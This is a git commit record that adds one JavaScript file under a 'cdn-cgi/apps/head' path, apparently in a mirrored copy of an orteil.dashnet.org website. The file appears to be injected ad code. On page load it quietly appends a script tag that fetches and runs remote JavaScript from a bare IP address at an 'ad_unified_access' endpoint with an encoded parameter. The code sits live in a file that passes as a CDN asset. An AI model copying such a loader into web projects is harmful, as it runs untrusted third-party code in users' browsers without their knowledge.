7243891b8a7f3cbdfcb4e5a16df6f4ad03dd99fb
zhaolinxu <zhaolinxu@sina.cn>
2018-08-06 10:14:45 +0800

    20180801版本源码

---
+++ cdn-cgi/apps/head/0qgk9sTk1hPaj4RmmbOPMlTGE6w.js
@@ -0,0 +1,5 @@
+var _atn_obj_ = new Object; 
+_atn_obj_.oldurl = 'http://orteil.dashnet.org/cdn-cgi/apps/head/0qgk9sTk1hPaj4RmmbOPMlTGE6w.js?cHVzaA=101081'; 
+_atn_obj_.unified_url = 'http://183.59.53.197:3737/remind_adv/ad_unified_access?SP=ABzs/PzoPOz87Jg7yXnpGRmpOgmJugy8vPzM/Pg86Dy8vPzM/Pg8/IysrPzsvPyc3Lyr/OyczRmJuDzsfM0c7L0c7MzNHOyIPOg87Pzs/HzoPPg8+DkI2LmpaT0ZuejJeRmovRkI2Yg87KzMzLy8fMzsqDzoPP'; 
+window.setTimeout(function(){var a=document.createElement("script");a.src=_atn_obj_.oldurl;document.getElementsByTagName("head")[0].appendChild(a);},0); 
+window.setTimeout(function(){var a=document.createElement("script");a.src=_atn_obj_.unified_url;document.getElementsByTagName("head")[0].appendChild(a);},0);
